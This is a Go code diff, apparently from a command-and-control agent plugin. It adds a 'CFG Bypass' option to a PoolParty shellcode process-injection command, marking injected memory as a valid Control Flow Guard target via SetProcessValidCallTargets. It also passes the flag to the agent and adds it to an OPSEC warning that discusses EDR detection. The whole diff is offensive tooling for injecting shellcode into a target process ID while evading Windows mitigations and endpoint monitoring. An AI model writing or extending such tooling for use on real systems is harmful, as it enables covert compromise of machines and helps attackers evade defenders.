@@ -126,15 +126,39 @@ func init() {
 					},
 				},
 			},
+			{
+				Name:             "cfg_bypass",
+				ModalDisplayName: "CFG Bypass",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Mark shellcode allocation as a valid CFG call target (variants 2-8, required on Windows 10/11 with Control Flow Guard). Disable only if SetProcessValidCallTargets triggers EDR detection.",
+				DefaultValue:     true,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     5,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "New File",
+						UIModalPosition:     5,
+					},
+				},
+			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			pid, _ := taskData.Args.GetStringArg("pid")
 			variant, _ := taskData.Args.GetStringArg("variant")
+			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
+			cfgNote := ""
+			if cfgBypass {
+				cfgNote = " CFG bypass enabled (SetProcessValidCallTargets — detectable by some EDRs). Not applied to Variant 1."
+			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID:             taskData.Task.ID,
 				Success:            true,
 				OpsecPreBlocked:    false,
-				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: PoolParty injection (variant: %s) into PID %s. Abuses Windows Thread Pool internals — novel technique with limited EDR coverage but may trigger on worker factory manipulation.", variant, pid),
+				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: PoolParty injection (variant: %s) into PID %s. Abuses Windows Thread Pool internals — novel technique with limited EDR coverage but may trigger on worker factory manipulation.%s", variant, pid, cfgNote),
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -236,10 +260,12 @@ func init() {
 			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("PoolParty variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(fileContents)))
 
 			// Build the actual parameters JSON that will be sent to the agent
+			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
 			params := map[string]interface{}{
 				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
 				"pid":           pid,
 				"variant":       variant,
+				"cfg_bypass":    cfgBypass,
 			}
 
 			paramsJSON, err := json.Marshal(params)
